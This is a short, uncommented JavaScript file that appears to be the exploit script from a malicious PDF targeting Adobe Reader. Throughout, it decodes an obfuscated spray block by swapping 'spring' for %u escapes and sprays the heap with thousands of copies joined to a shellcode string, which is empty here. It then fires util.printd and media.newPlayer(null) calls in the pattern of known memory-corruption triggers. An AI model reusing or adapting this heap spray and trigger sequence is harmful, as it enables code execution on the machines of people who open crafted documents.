function urpl(sc) {
    var keyu = "%u";
    var re = /spring/g;
    sc = sc.replace(re, keyu);
    return sc;
}

function ver() {
    var ver = app.viewerVersion;
    return ver;
}
var ver = ver();

function decom(sc) {
    var sprdataxx = "spring92d6spring9b99";
    var urpled = unescape(urpl(sc));
    var blknum = 0x8000;
    var sprdata = unescape(urpl(sprdataxx));

    while (sprdata.length < blknum)
        sprdata += sprdata;
    sprblk = sprdata.substring(0, sprdata.length);
    scblk = urpled.substring(0, urpled.length);
    memory = new Array();
    for (yu = 0; yu < 0x2500; yu++) memory[yu] = sprblk + scblk;

    util.printd("1.345678901.345678901.3456 : 1.31.34", new Date());
    util.printd("1.345678901.345678901.3456 : 1.31.34", new Date());
    try {
        this.media.newPlayer(null);
    } catch (e) {}
    util.printd("1.345678901.345678901.3456 : 1.31.34", new Date());
}
var s = "";

if ((ver >= 8) || (ver < 9.2)) decom(s);
else
    while (1) {};

